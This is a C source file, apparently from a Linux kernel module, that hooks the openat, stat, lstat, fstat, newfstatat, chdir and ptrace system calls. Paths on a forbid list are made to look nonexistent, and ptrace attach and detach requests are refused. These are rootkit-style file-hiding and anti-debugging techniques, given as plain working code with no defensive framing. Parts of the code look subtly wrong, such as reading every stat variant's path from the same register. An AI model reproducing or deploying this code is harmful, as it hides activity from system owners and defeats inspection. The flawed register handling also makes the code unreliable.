#include "forbid.h"
#include "forbid_api.h"

asmlinkage long (*__orig_openat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_newfstatat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_fstat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_lstat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_stat)(const struct pt_regs *) = NULL;
asmlinkage long (*__orig_chdir)(const struct pt_regs *regs) = NULL;
asmlinkage long (*__orig_ptrace)(const struct pt_regs *regs) = NULL;

asmlinkage long notrace openat_hook(const struct pt_regs *regs) {
    const char __user *u_path = (const char __user *)regs->si;
    if (forbid_contains(u_path))
        return -ENOENT;
    
    return __orig_openat(regs);
}

asmlinkage long notrace stat_hook(const struct pt_regs *regs) {
    const char __user *u_path = (const char __user *)regs->si;
    if (forbid_contains(u_path))
        return -ENOENT;

    switch ((int)regs->orig_ax) {
    case __NR_stat:
        return __orig_stat(regs);
    case __NR_lstat:
        return __orig_lstat(regs);
    case __NR_fstat:
        return __orig_fstat(regs);
    case __NR_newfstatat:
        return __orig_newfstatat(regs);
    default:
        return -ENOENT;
    }
}

asmlinkage long notrace chdir_hook(const struct pt_regs *regs) {
    const char __user *u_path = (const char __user *)regs->di;
    if (forbid_contains(u_path))
        return -ENOENT;
    return __orig_chdir(regs);
}

asmlinkage void notrace ptrace_hook(struct pt_regs *regs) {
    long request = regs->di;

    // Check pid for special processes ? Don't know if this function is very useful...
    // pid_t pid = regs->si;

    if (request == PTRACE_ATTACH || request == PTRACE_TRACEME || request == PTRACE_DETACH) {
        regs->ax = -EPERM;
    }
    else {
        regs->ax = __orig_ptrace(regs);
    }
}